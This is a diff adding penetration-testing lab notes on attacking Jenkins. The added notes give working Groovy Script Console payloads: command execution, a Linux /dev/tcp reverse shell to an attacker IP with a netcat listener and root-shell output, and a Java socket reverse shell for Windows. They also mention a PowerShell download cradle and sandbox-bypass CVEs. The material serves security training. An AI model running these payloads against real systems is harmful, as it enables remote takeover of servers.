@@ -1297,3 +1297,104 @@ http://jenkins.inlanefreight.local:8000/login?from=%2F
 * Such configurations have been found in **internal and occasionally external** penetration tests.
 
 ---
+
+# Attacking Jenkins
+
+Once access is gained to a Jenkins application (e.g., via weak credentials), there are multiple attack paths, the most straightforward being **Remote Code Execution (RCE)** via the **Script Console**.
+
+## 1. Script Console
+
+### URL
+```plaintext
+http://jenkins.inlanefreight.local:8000/script
+````
+
+* Allows execution of **Groovy scripts** in the Jenkins controller runtime.
+* **Groovy**: Java-compatible language (similar to Python/Ruby), compiled to Java bytecode.
+* Often Jenkins runs as **SYSTEM/root**, making this an easy privilege escalation vector.
+
+### Example: Execute `id` Command (Linux)
+
+```groovy
+def cmd = 'id'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+```
+
+## 2. Reverse Shell (Linux)
+
+### Groovy Reverse Shell
+
+```groovy
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+### Listener Example
+
+```bash
+nc -lvnp 8443
+```
+
+**Output:**
+
+```plaintext
+connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844
+id
+uid=0(root) gid=0(root) groups=0(root)
+/bin/bash -i
+```
+## 3. Windows Command Execution
+
+### Basic Command Execution
+
+```groovy
+def cmd = "cmd.exe /c dir".execute();
+println("${cmd.text}");
+```
+
+### Reverse Shell (Java - Windows)
+
+```groovy
+String host="localhost";
+int port=8044;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host,port);
+InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+while(!s.isClosed()){
+  while(pi.available()>0)so.write(pi.read());
+  while(pe.available()>0)so.write(pe.read());
+  while(si.available()>0)po.write(si.read());
+  so.flush();po.flush();
+  Thread.sleep(50);
+  try {p.exitValue();break;} catch (Exception e){}
+};
+p.destroy();s.close();
+```
+
+### PowerShell Cradle (Windows)
+
+* Use **Invoke-PowerShellTcp.ps1** script.
+* Example payload: PowerShell one-liner to download and execute.
+
+## 4. Miscellaneous Vulnerabilities
+
+### CVE-2018-1999002 & CVE-2019-1003000
+
+* **Unauthenticated RCE**
+* Bypasses **Groovy sandbox protections**
+* Exploits dynamic routing to load & execute malicious JAR files
+
+### Jenkins 2.150.2 - Node.js RCE
+
+* Requires **JOB creation** and **BUILD** privileges
+* Exploitable if **anonymous access** is enabled (default grants these permissions)
+
+---
+
